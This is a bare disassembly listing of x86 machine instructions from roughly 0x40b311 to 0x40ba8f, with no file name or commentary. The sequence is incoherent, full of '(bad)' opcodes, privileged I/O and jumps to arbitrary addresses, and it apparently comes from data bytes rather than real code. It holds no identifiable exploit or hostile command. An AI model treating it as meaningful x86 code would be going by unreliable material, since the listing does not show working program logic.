  40b311:	jae    0x40b2d3
  40b313:	ret    0x3027
  40b316:	pop    edi
  40b317:	cmp    DWORD PTR [ebx],edx
  40b319:	mov    al,0x4b
  40b31b:	jne    0x40b2da
  40b31d:	jo     0x40b310
  40b31f:	add    BYTE PTR [eax],bl
  40b321:	cli    
  40b322:	ins    DWORD PTR es:[edi],dx
  40b323:	add    DWORD PTR cs:[eax-0x8],ecx
  40b327:	imul   ebx,DWORD PTR [eax+0x21d948],0x42
  40b32e:	int3   
  40b32f:	js     0x40b351
  40b331:	and    BYTE PTR [ebx+0x5ae33a1b],al
  40b337:	mov    al,0x63
  40b339:	add    DWORD PTR [esi],ecx
  40b33b:	add    al,0x64
  40b33d:	and    ch,BYTE PTR [eax-0x49]
  40b340:	adc    eax,0x7e684ea7
  40b345:	(bad)  
  40b346:	adc    ebp,DWORD PTR [ecx]
  40b348:	mov    edi,0x9c7fdff2
  40b34d:	(bad)  
  40b34e:	push   ds
  40b34f:	jnp    0x40b35d
  40b351:	jo     0x40b3a1
  40b353:	xlat   BYTE PTR ds:[ebx]
  40b354:	js     0x40b302
  40b356:	js     0x40b308
  40b358:	pop    ss
  40b359:	shl    DWORD PTR [eiz*8-0x1de1785f],cl
  40b360:	aaa    
  40b361:	jg     0x40b3d0
  40b363:	xchg   DWORD PTR [edi-0xdd0dc1],esp
  40b369:	(bad)  
  40b36a:	mov    edi,0x3caf967a
  40b36f:	cmp    esp,DWORD PTR [edi+edx*8]
  40b372:	fcomi  st,st(5)
  40b374:	push   edi
  40b375:	sbb    edx,DWORD PTR [edx-0x76]
  40b378:	inc    ebx
  40b379:	and    ecx,DWORD PTR [edi+0x3695849d]
  40b37f:	jns    0x40b400
  40b381:	inc    eax
  40b382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b383:	pop    ecx
  40b384:	or     eax,0xbd5420a7
  40b389:	mov    edi,0x4f43e4a0
  40b38e:	in     al,dx
  40b38f:	repz fwait
  40b391:	jmp    eax
  40b393:	or     DWORD PTR [esi+0x79aa36b7],esi
  40b399:	std    
  40b39a:	loop   0x40b413
  40b39c:	mov    ebx,0xfaaf5dea
  40b3a1:	fsubp  st(5),st
  40b3a3:	jbe    0x40b36e
  40b3a5:	repz pushf 
  40b3a7:	das    
  40b3a8:	cld    
  40b3a9:	(bad)  
  40b3aa:	xlat   BYTE PTR ds:[ebx]
  40b3ab:	mov    ecx,0xe670d578
  40b3b0:	rol    DWORD PTR [edi-0x17],0x74
  40b3b4:	ss push 0xddbc3677
  40b3ba:	iret   
  40b3bb:	sub    dh,0xc7
  40b3be:	cli    
  40b3bf:	sub    al,0xc2
  40b3c1:	lods   eax,DWORD PTR ds:[esi]
  40b3c2:	mov    ecx,0x73cc5d7a
  40b3c7:	mov    edx,0x8884df30
  40b3cc:	cwde   
  40b3cd:	inc    edx
  40b3ce:	int    0xef
  40b3d0:	loop   0x40b35d
  40b3d2:	inc    esi
  40b3d3:	iret   
  40b3d4:	push   ss
  40b3d5:	mul    DWORD PTR ds:0xc9aa4375
  40b3db:	cmp    al,0xfc
  40b3dd:	lea    ecx,[eax-0x4f272278]
  40b3e3:	add    dh,BYTE PTR [eax+0x2c03d6ad]
  40b3e9:	dec    ebx
  40b3ea:	mov    esi,DWORD PTR [edi+eax*4+0x308cd274]
  40b3f1:	jg     0x40b3d5
  40b3f3:	stos   BYTE PTR es:[edi],al
  40b3f4:	cli    
  40b3f5:	or     bl,dh
  40b3f7:	and    esi,DWORD PTR [eax*2-0x7bd04ef8]
  40b3fe:	js     0x40b457
  40b400:	inc    ebx
  40b401:	xor    BYTE PTR [eax+0x3c],0x6
  40b405:	mov    al,0x13
  40b407:	pushf  
  40b408:	xor    eax,0xad1b76ed
  40b40d:	or     eax,0xb1b39965
  40b412:	xor    eax,esp
  40b414:	in     al,dx
  40b415:	and    esp,DWORD PTR [edi]
  40b417:	jns    0x40b409
  40b419:	cmp    eax,0x30da30e7
  40b41e:	lahf   
  40b41f:	into   
  40b420:	cmp    DWORD PTR [eax],edi
  40b422:	fsub   QWORD PTR [edi+0x30]
  40b425:	sbb    al,0x54
  40b427:	cmp    eax,esp
  40b429:	inc    ebp
  40b42a:	push   ecx
  40b42b:	push   esp
  40b42c:	imul   ebx,DWORD PTR [esi-0x3fe0a241],0xffffffdd
  40b433:	mov    dh,0x1d
  40b435:	mov    ch,0xff
  40b437:	pop    esi
  40b438:	jge    0x40b43c
  40b43a:	popf   
  40b43b:	dec    esi
  40b43c:	(bad)  
  40b43d:	or     eax,0x1ad34d57
  40b442:	and    edx,DWORD PTR [esi+0x4a]
  40b445:	xchg   ecx,eax
  40b446:	addr16 sbb edi,edx
  40b449:	scas   al,BYTE PTR es:[edi]
  40b44a:	iret   
  40b44b:	icebp  
  40b44c:	mov    ds:0x2d2ebda1,eax
  40b451:	fwait
  40b452:	add    ch,dl
  40b454:	mov    bl,0x79
  40b456:	test   DWORD PTR [edi+0x52],ebp
  40b459:	pusha  
  40b45a:	jecxz  0x40b499
  40b45c:	out    0x36,eax
  40b45e:	add    BYTE PTR [eax+0xbd36bf5],0xb7
  40b465:	daa    
  40b466:	push   ecx
  40b467:	cmp    edi,ebp
  40b469:	jmp    DWORD PTR [eax-0x4203e01a]
  40b46f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b470:	jns    0x40b456
  40b472:	xchg   ecx,eax
  40b473:	inc    edi
  40b474:	adc    BYTE PTR [edx+0x54],al
  40b477:	icebp  
  40b478:	loope  0x40b4cf
  40b47a:	rcl    DWORD PTR [eax+esi*1-0x2448915d],1
  40b481:	in     eax,0x67
  40b483:	jg     0x40b46b
  40b485:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b486:	jns    0x40b477
  40b488:	jecxz  0x40b499
  40b48a:	icebp  
  40b48b:	scas   eax,DWORD PTR es:[edi]
  40b48c:	jle    0x40b489
  40b48e:	dec    ebx
  40b48f:	cld    
  40b490:	lahf   
  40b491:	push   esi
  40b493:	add    ah,bl
  40b495:	fld    DWORD PTR [ebx-0x28]
  40b498:	(bad)  
  40b49a:	lea    ebx,[edx+0x7a]
  40b49d:	int    0x14
  40b49f:	push   0x3482fa86
  40b4a4:	cld    
  40b4a5:	add    DWORD PTR [ebp-0x17279023],edx
  40b4ab:	fsubr  st(4),st
  40b4ad:	out    dx,eax
  40b4ae:	std    
  40b4af:	repnz mov BYTE PTR [edi+0x46ae77de],ah
  40b4b6:	std    
  40b4b7:	jecxz  0x40b4b3
  40b4b9:	(bad)  
  40b4ba:	jmp    0x40b4f8
  40b4bc:	jl     0x40b4a0
  40b4be:	cli    
  40b4bf:	push   cs
  40b4c0:	jne    0x40b460
  40b4c2:	and    al,0x9
  40b4c4:	pop    edi
  40b4c5:	dec    dl
  40b4c7:	mov    bl,0xfc
  40b4c9:	jmp    0xdc72e405
  40b4ce:	jp     0x40b462
  40b4d0:	dec    esi
  40b4d1:	outs   dx,DWORD PTR ds:[esi]
  40b4d2:	xchg   ebx,eax
  40b4d3:	jbe    0x40b53c
  40b4d5:	add    al,0xc8
  40b4d7:	lds    ecx,FWORD PTR [ebx+ecx*8]
  40b4da:	adc    eax,0xfbed8f65
  40b4df:	mov    eax,0x5337580d
  40b4e4:	dec    ebp
  40b4e5:	fild   WORD PTR gs:[edi-0x61153389]
  40b4ec:	pop    ebx
  40b4ed:	aam    0x15
  40b4ef:	ds pushf 
  40b4f1:	mov    ds:0xbaa10209,eax
  40b4f6:	test   al,0x9d
  40b4f8:	push   ebx
  40b4f9:	inc    esp
  40b4fa:	jne    0x40b4e3
  40b4fc:	mov    esi,0xe8801356
  40b501:	jp     0x40b531
  40b503:	and    BYTE PTR [esi+eax*4+0x14],0xf3
  40b508:	mov    ah,BYTE PTR ds:0x2d6b12ac
  40b50e:	mov    bl,0xd9
  40b510:	ins    BYTE PTR es:[edi],dx
  40b511:	imul   edi,eax,0xcc6210b3
  40b517:	and    ah,dh
  40b519:	cli    
  40b51a:	scas   al,BYTE PTR es:[edi]
  40b51b:	leave  
  40b51c:	jno    0x40b536
  40b51e:	rol    BYTE PTR [esi+0x0],0x0
  40b522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b523:	adc    ch,BYTE PTR [edi-0x44896dfc]
  40b529:	ret    
  40b52a:	push   edi
  40b52b:	mov    esi,0x9d3a45f2
  40b530:	ds pop ds
  40b532:	(bad)  
  40b533:	lock shl DWORD PTR [edi+eax*1+0x1d],cl
  40b538:	cli    
  40b539:	inc    ebx
  40b53a:	aaa    
  40b53b:	call   0x779eeb07
  40b540:	cld    
  40b541:	push   ecx
  40b542:	or     BYTE PTR [eax-0x6c],bh
  40b545:	fmul   QWORD PTR [ebp-0xf]
  40b548:	out    dx,eax
  40b549:	aad    0x1f
  40b54b:	adc    BYTE PTR [edi-0x5],bl
  40b54e:	mov    fs,WORD PTR [eax]
  40b550:	mov    al,ds:0x4fffc535
  40b555:	fnstsw WORD PTR [ebx-0x39]
  40b558:	pop    ebx
  40b559:	xchg   esi,eax
  40b55a:	pop    ebp
  40b55b:	cmc    
  40b55c:	popf   
  40b55d:	fistp  QWORD PTR [ebp-0x32]
  40b560:	mov    ecx,0x2f58bef9
  40b565:	aad    0xab
  40b567:	push   edi
  40b568:	mov    eax,ds:0xd5abbabb
  40b56d:	sub    eax,0x2dd5b51a
  40b572:	pop    ecx
  40b573:	adc    ch,BYTE PTR ds:0x63242509
  40b579:	sbb    DWORD PTR [ecx+0x60],ecx
  40b57c:	test   BYTE PTR [edx],al
  40b57e:	add    ch,BYTE PTR [esi+eax*8-0x2]
  40b582:	int3   
  40b583:	mov    ebx,fs
  40b585:	pusha  
  40b586:	iret   
  40b587:	or     al,0x1f
  40b589:	arpl   WORD PTR [edi+0x3481c01c],cx
  40b58f:	mul    BYTE PTR [eax-0x7d]
  40b592:	(bad)  
  40b593:	data16 xchg BYTE PTR [eax-0x40],ah
  40b597:	pusha  
  40b598:	les    eax,FWORD PTR [eax+0x42d90208]
  40b59e:	push   0x9
  40b5a0:	dec    ecx
  40b5a1:	je     0x40b55a
  40b5a3:	cmp    dh,BYTE PTR [edi+0x75]
  40b5a6:	push   ebp
  40b5a7:	xchg   DWORD PTR [edx-0x51],ecx
  40b5aa:	repnz stos DWORD PTR es:[edi],eax
  40b5ac:	jp     0x40b5a7
  40b5ae:	out    0x7b,al
  40b5b0:	ret    0x3f9e
  40b5b3:	jbe    0x40b5ed
  40b5b5:	sti    
  40b5b6:	pushf  
  40b5b7:	jnp    0x40b617
  40b5b9:	push   ebp
  40b5ba:	mov    ebp,0xef1aaa92
  40b5bf:	dec    edi
  40b5c0:	mov    ebp,0x7d8727ba
  40b5c5:	neg    BYTE PTR [edx-0x15]
  40b5c8:	mov    bh,0xc2
  40b5ca:	pop    esi
  40b5cb:	sub    ecx,DWORD PTR [ecx+ebp*1]
  40b5ce:	xchg   ebp,eax
  40b5cf:	retf   
  40b5d0:	out    dx,al
  40b5d1:	or     eax,0x6c4a9729
  40b5d6:	ins    BYTE PTR es:[edi],dx
  40b5d7:	outs   dx,BYTE PTR ds:[esi]
  40b5d8:	mov    dl,0xb1
  40b5da:	sub    DWORD PTR [eax+0x63ef57d2],edx
  40b5e0:	push   esp
  40b5e1:	add    dl,dl
  40b5e3:	jmp    0x45:0x3f686435
  40b5ea:	test   eax,0x4109a00a
  40b5ef:	call   0x6988c6e7
  40b5f4:	and    ch,dh
  40b5f6:	aam    0xbe
  40b5f8:	push   0x79
  40b5fa:	xor    DWORD PTR [edi],0xffffffbd
  40b5fd:	popa   
  40b5fe:	das    
  40b5ff:	ja     0x40b5de
  40b601:	jne    0x40b62a
  40b603:	in     eax,0x72
  40b605:	(bad)  [esi]
  40b607:	or     al,0xf3
  40b609:	mov    WORD PTR [ecx+0x57],?
  40b60c:	stos   BYTE PTR es:[edi],al
  40b60d:	pop    ecx
  40b60e:	push   cs
  40b60f:	ret    
  40b610:	shl    BYTE PTR [edx+0x7ff5ff81],1
  40b616:	stc    
  40b617:	add    BYTE PTR [ebx-0x5],cl
  40b61a:	mov    esi,0xc7fccfc0
  40b61f:	rcr    DWORD PTR [eax+ebx*2-0x43],cl
  40b623:	add    DWORD PTR [edx+ebx*4+0x4f],0xffffff9c
  40b628:	push   ecx
  40b629:	hlt    
  40b62a:	sbb    DWORD PTR [ebp-0x3],esi
  40b62d:	mov    ecx,0xd8737e56
  40b632:	test   al,0xf1
  40b634:	iret   
  40b635:	mul    DWORD PTR [ebx]
  40b637:	fdivp  st(1),st
  40b639:	out    0x21,al
  40b63b:	pop    ds
  40b63c:	cld    
  40b63d:	test   bl,0x94
  40b640:	dec    edx
  40b641:	dec    edx
  40b642:	jp     0x40b629
  40b644:	and    eax,0xfee9158
  40b649:	sub    DWORD PTR [edx+0x31],esi
  40b64c:	stc    
  40b64d:	cld    
  40b64e:	jmp    0x40b645
  40b650:	cmp    ah,BYTE PTR [edi+0xfe59f4f]
  40b656:	(bad)  
  40b657:	jmp    0x40b5ec
  40b659:	adc    ah,ch
  40b65b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b65c:	cmp    DWORD PTR [ecx],esi
  40b65e:	dec    edi
  40b65f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b660:	xor    al,BYTE PTR [ecx+0x32755417]
  40b666:	mov    ds:0x8ac4c7ac,eax
  40b66b:	jge    0x40b62a
  40b66d:	sub    al,0x32
  40b66f:	(bad)  
  40b671:	cmc    
  40b672:	ss xchg ecx,eax
  40b674:	xor    al,BYTE PTR [edi]
  40b676:	xchg   esi,esp
  40b678:	inc    esi
  40b679:	ins    BYTE PTR es:[edi],dx
  40b67a:	add    esp,DWORD PTR [esi+0x18ee451f]
  40b680:	mov    bl,0x20
  40b682:	int    0xf5
  40b684:	jb     0x40b63c
  40b686:	add    DWORD PTR [edx],0x2224907c
  40b68c:	xor    eax,0x152ac5fe
  40b691:	pop    edx
  40b692:	adc    al,0x42
  40b694:	lods   eax,DWORD PTR ds:[esi]
  40b695:	adc    al,0x33
  40b697:	xor    edi,DWORD PTR ds:0xf264636e
  40b69d:	xchg   BYTE PTR [eax-0x2d],al
  40b6a0:	daa    
  40b6a1:	outs   dx,BYTE PTR ds:[esi]
  40b6a2:	xor    eax,0x6f1be720
  40b6a7:	mov    ds:0x696f8142,eax
  40b6ac:	fisttp DWORD PTR ds:0x83b24802
  40b6b2:	iret   
  40b6b3:	mov    bl,0x86
  40b6b5:	xor    ch,ah
  40b6b7:	imul   ebp
  40b6b9:	add    ch,BYTE PTR [edx-0x3ff86b21]
  40b6bf:	shl    DWORD PTR [esi],cl
  40b6c1:	sbb    BYTE PTR [ebp+0x3d7d7b67],0xb0
  40b6c8:	jg     0x40b701
  40b6ca:	sti    
  40b6cb:	int    0xb2
  40b6cd:	mov    ecx,0x2176c8ff
  40b6d2:	call   0x864db2cc
  40b6d7:	inc    ebx
  40b6d8:	xchg   ebp,eax
  40b6d9:	or     DWORD PTR [eax+0x6f],ebx
  40b6dc:	xchg   ebx,eax
  40b6dd:	push   edx
  40b6de:	push   edx
  40b6df:	scas   al,BYTE PTR es:[edi]
  40b6e0:	xchg   esp,eax
  40b6e1:	cmp    DWORD PTR [edi-0x6],edi
  40b6e4:	and    dl,BYTE PTR [edi+0x57]
  40b6e7:	push   ebx
  40b6e8:	leave  
  40b6e9:	and    DWORD PTR [edi+ecx*1+0x40],ebx
  40b6ed:	bound  esi,QWORD PTR [ebx+edi*2+0xd0649dd]
  40b6f4:	push   0xf1965b77
  40b6f9:	imul   ebx,eax,0xf4143c29
  40b6ff:	push   edi
  40b700:	test   BYTE PTR [eax],ch
  40b702:	adc    DWORD PTR [edx+esi*2],esp
  40b705:	enter  0xd8e4,0x80
  40b709:	mov    ebx,0x5aa1ef0f
  40b70e:	lods   eax,DWORD PTR ds:[esi]
  40b70f:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b711:	iret   
  40b712:	out    0xfb,al
  40b714:	scas   al,BYTE PTR es:[edi]
  40b715:	call   0xce219ff1
  40b71a:	xchg   bx,ax
  40b71c:	dec    edi
  40b71d:	jl     0x40b70b
  40b71f:	cmp    eax,0x927a581c
  40b724:	lahf   
  40b725:	cld    
  40b726:	ja     0x40b757
  40b728:	lock in al,dx
  40b72a:	dec    ebx
  40b72b:	or     eax,DWORD PTR [ecx+edx*2-0x12de8ca7]
  40b732:	jmp    0xdb0d:0x32633433
  40b739:	shl    BYTE PTR [ebx+0x45],cl
  40b73c:	dec    esp
  40b73d:	rcl    BYTE PTR [ecx+0xb],0xa4
  40b741:	(bad)  
  40b742:	(bad)  
  40b744:	xlat   BYTE PTR ds:[ebx]
  40b745:	clc    
  40b746:	lahf   
  40b747:	jg     0x40b729
  40b749:	xor    eax,0x598d8d8c
  40b74e:	loop   0x40b77f
  40b750:	cmp    ah,0x45
  40b753:	mov    edi,0xa73cd966
  40b758:	dec    edx
  40b759:	in     eax,dx
  40b75a:	cmc    
  40b75b:	sub    BYTE PTR [ebx],ch
  40b75d:	imul   eax,DWORD PTR [ecx],0xfffffff3
  40b760:	jnp    0x40b759
  40b762:	push   ecx
  40b763:	test   eax,0x8caa524c
  40b768:	xchg   ecx,eax
  40b769:	les    eax,FWORD PTR [edx+0x9784ac4]
  40b76f:	push   cs
  40b770:	shl    DWORD PTR [ebp+0x736f47c3],1
  40b776:	xchg   ecx,eax
  40b777:	adc    BYTE PTR [esp+eiz*4+0x59970cb6],0x4a
  40b77f:	push   edx
  40b780:	inc    ebx
  40b781:	lahf   
  40b782:	je     0x40b7b3
  40b784:	mov    ds:0x184e4101,al
  40b789:	mov    DWORD PTR [ebx+eax*8-0x31],edx
  40b78d:	fmul   DWORD PTR [edx]
  40b78f:	or     ah,BYTE PTR [esi+edx*4-0x6c]
  40b793:	sub    esp,esi
  40b795:	aaa    
  40b796:	jg     0x40b742
  40b798:	inc    edx
  40b799:	jb     0x40b763
  40b79b:	fdivr  DWORD PTR [eax-0x69]
  40b79e:	mov    ecx,0x5c061559
  40b7a3:	add    BYTE PTR fs:[edi],dh
  40b7a6:	(bad)  
  40b7a8:	adc    al,0x44
  40b7aa:	int    0x31
  40b7ac:	clc    
  40b7ad:	cmc    
  40b7ae:	out    dx,eax
  40b7af:	(bad)  
  40b7b0:	(bad)  
  40b7b1:	out    dx,eax
  40b7b2:	mov    edi,0xb04041a5
  40b7b7:	sti    
  40b7b8:	test   BYTE PTR [eax],ah
  40b7ba:	into   
  40b7bb:	(bad)  
  40b7bc:	xor    al,0xf
  40b7be:	push   0x6
  40b7c0:	imul   edi,DWORD PTR [esi],0xc0b667c9
  40b7c6:	inc    ebx
  40b7c7:	push   ecx
  40b7c8:	dec    ecx
  40b7c9:	in     al,0x1b
  40b7cb:	cmp    ebp,0x6bf223d7
  40b7d1:	popf   
  40b7d2:	push   ebx
  40b7d3:	mov    ah,0x6c
  40b7d5:	fisub  WORD PTR ds:0x1e7987a3
  40b7db:	popa   
  40b7dc:	mov    edi,0xee003d6f
  40b7e1:	mov    cl,0xe5
  40b7e3:	jb     0x40b77e
  40b7e5:	stos   DWORD PTR es:[edi],eax
  40b7e6:	stos   DWORD PTR es:[edi],eax
  40b7e7:	pop    ebx
  40b7e8:	mov    ah,0xdb
  40b7ea:	sahf   
  40b7eb:	call   0xa40c:0x9e842b89
  40b7f2:	mov    cs,WORD PTR [ebx-0x5c]
  40b7f5:	inc    esp
  40b7f6:	and    al,0xd9
  40b7f8:	jmp    0x40b861
  40b7fa:	jne    0x40b87b
  40b7fc:	in     al,dx
  40b7fd:	mov    dl,0xdd
  40b7ff:	dec    esi
  40b800:	mov    ds:0x5af40363,al
  40b805:	and    dl,BYTE PTR [eax-0x505f33b7]
  40b80b:	mov    ds:0x72e5cb27,al
  40b810:	popa   
  40b811:	lea    edi,[eax-0x2d]
  40b814:	lahf   
  40b815:	scas   al,BYTE PTR es:[edi]
  40b816:	sub    eax,0x63a2adc3
  40b81b:	je     0x40b80e
  40b81d:	jb     0x40b7d8
  40b81f:	int3   
  40b820:	mov    ebx,0xf626f5df
  40b825:	cs dec esp
  40b827:	icebp  
  40b828:	mov    ds:0x7c27f13f,eax
  40b82d:	loope  0x40b800
  40b82f:	or     DWORD PTR [edx],esp
  40b831:	cmp    DWORD PTR [ecx+0x529999bf],esp
  40b837:	lods   al,BYTE PTR ds:[esi]
  40b838:	and    eax,0x50615164
  40b83d:	xlat   BYTE PTR ds:[ebx]
  40b83e:	cli    
  40b83f:	out    dx,eax
  40b840:	inc    esp
  40b841:	sbb    eax,0xf9b78d4e
  40b846:	sahf   
  40b847:	div    DWORD PTR [edi]
  40b849:	mov    eax,0xb12a35ef
  40b84e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b84f:	dec    ebx
  40b850:	cld    
  40b851:	inc    ebp
  40b852:	mov    edi,0xb6600aae
  40b857:	sbb    DWORD PTR [ebp+0x3e7df7c5],edx
  40b85d:	idiv   ecx
  40b85f:	inc    edi
  40b860:	jns    0x40b85c
  40b862:	stc    
  40b863:	sub    ecx,DWORD PTR [esp+ecx*2-0x23]
  40b867:	dec    ebx
  40b868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b869:	ss inc ebp
  40b86b:	test   eax,0xd6f80e3c
  40b870:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b871:	xor    BYTE PTR [ecx+0x7d6b5bf6],0x2a
  40b878:	xchg   ebp,eax
  40b879:	push   ebx
  40b87a:	push   cs
  40b87b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b87c:	ja     0x40b80d
  40b87e:	loopne 0x40b8f7
  40b880:	rep lods eax,DWORD PTR ds:[esi]
  40b882:	frstor [ebx-0xb]
  40b885:	mov    ecx,0x1bca0546
  40b88a:	pop    ss
  40b88b:	in     eax,dx
  40b88c:	mov    eax,ds:0x2bd21de9
  40b891:	mov    ecx,0x622ea787
  40b896:	cmc    
  40b897:	pop    ebp
  40b898:	test   esi,ecx
  40b89a:	push   es
  40b89b:	and    al,0xd3
  40b89d:	lods   al,BYTE PTR ds:[esi]
  40b89e:	inc    eax
  40b89f:	dec    ecx
  40b8a0:	inc    edx
  40b8a1:	loopne 0x40b91a
  40b8a3:	or     DWORD PTR [edx+0x367ec239],eax
  40b8a9:	mov    eax,ds:0xcf1be98f
  40b8ae:	repz scas al,BYTE PTR es:[edi]
  40b8b0:	push   ebp
  40b8b1:	or     eax,0xd0db9b68
  40b8b6:	scas   al,BYTE PTR es:[edi]
  40b8b7:	aas    
  40b8b8:	aas    
  40b8b9:	aaa    
  40b8ba:	xlat   BYTE PTR ds:[ebx]
  40b8bb:	or     al,0x57
  40b8bd:	xchg   esi,eax
  40b8be:	xor    dl,cl
  40b8c0:	pop    ecx
  40b8c1:	jno    0x40b8af
  40b8c3:	sahf   
  40b8c4:	adc    DWORD PTR ds:0xaae8cd55,edi
  40b8ca:	loopne 0x40b945
  40b8cc:	push   ds
  40b8cd:	mov    ebp,0x489b2f5e
  40b8d2:	les    ebp,FWORD PTR [ecx+0x45]
  40b8d5:	xchg   edx,eax
  40b8d6:	mov    ds:0xdceb5da8,al
  40b8db:	(bad)  [ebx+edi*4]
  40b8de:	div    DWORD PTR [ebx]
  40b8e0:	pop    ds
  40b8e1:	arpl   WORD PTR [eax],di
  40b8e3:	sbb    al,0x2a
  40b8e5:	adc    BYTE PTR [ebx],0xc2
  40b8e8:	stc    
  40b8e9:	loopne 0x40b8ed
  40b8eb:	aas    
  40b8ec:	lock fldcw WORD PTR [esi+0xd]
  40b8f0:	dec    eax
  40b8f1:	mov    ds:0xf564d98a,al
  40b8f6:	jg     0x40b91d
  40b8f8:	int    0xd2
  40b8fa:	add    dl,BYTE PTR [esi-0x2b668b5a]
  40b900:	cmp    ah,BYTE PTR [ecx+0x7f230e91]
  40b906:	mov    cl,0x2a
  40b908:	and    bl,BYTE PTR [edx-0x5be3153c]
  40b90e:	and    al,0x49
  40b910:	jl     0x40b8ec
  40b912:	pop    ebp
  40b913:	lahf   
  40b914:	sub    edx,DWORD PTR [edi+0x55]
  40b917:	rcl    BYTE PTR [ecx+ebp*4+0x54],0x2
  40b91c:	shr    BYTE PTR [ecx],cl
  40b91e:	mov    cl,0x26
  40b920:	dec    edx
  40b921:	into   
  40b922:	jge    0x40b992
  40b924:	xlat   BYTE PTR ds:[ebx]
  40b925:	jmp    0x6369:0x4a5cfa6e
  40b92c:	sbb    DWORD PTR [esi-0x3ca16417],edi
  40b932:	dec    edi
  40b933:	(bad)  
  40b934:	fcomp  DWORD PTR [edi-0x20]
  40b937:	mov    ebx,0xb29b62ff
  40b93c:	ja     0x40b957
  40b93e:	lods   al,BYTE PTR ds:[esi]
  40b93f:	shr    DWORD PTR [ebx],1
  40b941:	push   ecx
  40b942:	retf   
  40b943:	sub    DWORD PTR [edi-0x42fdbcbd],esi
  40b949:	pushf  
  40b94a:	cmp    bl,bl
  40b94c:	add    DWORD PTR [ecx-0x219df5b0],ebx
  40b952:	cli    
  40b953:	push   eax
  40b954:	enter  0xbe07,0xfd
  40b958:	mov    al,0x8a
  40b95a:	cwde   
  40b95b:	aam    0xf6
  40b95d:	xchg   esp,esi
  40b95f:	fnsave [ebx-0xc32c3bb]
  40b965:	mov    ecx,0xa9354cdb
  40b96a:	inc    esi
  40b96b:	mov    ds:0xce272bc1,eax
  40b970:	lock fistp QWORD PTR [esi]
  40b973:	(bad)  
  40b974:	cmp    al,0x22
  40b976:	pop    eax
  40b977:	mov    al,ds:0x52a598de
  40b97c:	sbb    eax,0x242af7c7
  40b981:	mov    cl,0xb4
  40b983:	(bad)  
  40b984:	je     0x40b98b
  40b986:	stos   DWORD PTR es:[edi],eax
  40b987:	fidiv  DWORD PTR gs:[edi-0x22aa4046]
  40b98e:	cmp    eax,0xb0256ebd
  40b993:	fcmovnb st,st(7)
  40b995:	out    0x7c,al
  40b997:	addr16 mov ebx,0x115acc54
  40b99d:	test   eax,0x1e94dcca
  40b9a2:	lahf   
  40b9a3:	call   0xf82f4002
  40b9a8:	push   esp
  40b9a9:	(bad)  
  40b9aa:	mov    ecx,0xe7dcfcb3
  40b9af:	xor    bh,BYTE PTR [edi+0x52]
  40b9b2:	push   0xffffffc2
  40b9b4:	(bad)  
  40b9b5:	adc    edx,DWORD PTR [edx-0x2b022a8]
  40b9bb:	inc    ebp
  40b9bc:	xor    al,0xaa
  40b9be:	adc    DWORD PTR [esi-0x5cece179],ebx
  40b9c4:	in     eax,0xc0
  40b9c6:	cmp    eax,0xeddba3cf
  40b9cb:	fidivr DWORD PTR [ecx+ecx*4]
  40b9ce:	mov    ecx,0x814a4b76
  40b9d3:	in     eax,0xdb
  40b9d5:	outs   dx,BYTE PTR ds:[esi]
  40b9d6:	adc    BYTE PTR [eax+0x3],al
  40b9d9:	mov    al,0x11
  40b9db:	pop    ebx
  40b9dc:	or     BYTE PTR [esi-0x78],0x99
  40b9e0:	jmp    0x772f:0xce9fbe2e
  40b9e7:	push   ecx
  40b9e8:	and    edi,0x1d3a7479
  40b9ee:	jmp    0x40b9f9
  40b9f0:	mov    eax,0x1be00d96
  40b9f5:	or     eax,0xce5a77fb
  40b9fa:	adc    BYTE PTR ds:0x385b7d28,cl
  40ba00:	pop    edx
  40ba01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba02:	push   esp
  40ba03:	test   BYTE PTR [esi],0x35
  40ba06:	or     eax,0x25c64438
  40ba0b:	or     BYTE PTR [ecx+eax*2-0x56c5ba37],dl
  40ba12:	fs iret 
  40ba14:	pop    ebx
  40ba15:	std    
  40ba16:	mov    cl,0x56
  40ba18:	imul   ax,WORD PTR [edx+esi*4],0xffb6
  40ba1d:	add    BYTE PTR [ebp-0x70],dh
  40ba20:	les    esi,FWORD PTR [ebx+0x23c124b2]
  40ba26:	push   cs
  40ba27:	daa    
  40ba28:	jns    0x40ba1e
  40ba2a:	icebp  
  40ba2b:	sar    DWORD PTR [edi+esi*8+0x42765adb],cl
  40ba32:	lea    ebx,[ebx]
  40ba34:	and    DWORD PTR [esi+0x422d0313],esi
  40ba3a:	inc    ebx
  40ba3b:	xchg   BYTE PTR [ecx-0x778bc5e3],ah
  40ba41:	jg     0x40ba3c
  40ba43:	dec    edi
  40ba44:	aas    
  40ba45:	int3   
  40ba46:	int3   
  40ba47:	hlt    
  40ba48:	addr16 clc 
  40ba4a:	(bad)  
  40ba4b:	mov    edi,0xb47e9176
  40ba50:	dec    eax
  40ba51:	push   esi
  40ba52:	jp     0x40babe
  40ba54:	jnp    0x40b9d6
  40ba56:	xchg   ebx,eax
  40ba57:	in     eax,0x27
  40ba59:	test   esi,edi
  40ba5b:	add    al,BYTE PTR [ebx-0x2211f1f4]
  40ba61:	loop   0x40ba12
  40ba63:	jle    0x40ba59
  40ba65:	and    BYTE PTR [ebx-0x4d],dh
  40ba68:	xchg   ebx,eax
  40ba69:	xchg   esi,eax
  40ba6a:	lock scas eax,DWORD PTR es:[edi]
  40ba6c:	lds    ebx,FWORD PTR [eax-0x23]
  40ba6f:	in     eax,dx
  40ba70:	out    0x37,al
  40ba72:	dec    ecx
  40ba73:	adc    al,dh
  40ba75:	mov    edi,0x7cdab569
  40ba7b:	out    0xb3,al
  40ba7d:	(bad)  
  40ba7e:	mov    bl,0xb6
  40ba80:	push   ebp
  40ba81:	popa   
  40ba82:	iret   
  40ba83:	fdivr  QWORD PTR [esi]
  40ba85:	dec    edx
  40ba86:	xchg   ebp,eax
  40ba87:	xor    DWORD PTR [edx-0x5ffd5660],eax
  40ba8d:	mov    WORD PTR [ebx],ss
  40ba8f:	inc    edx
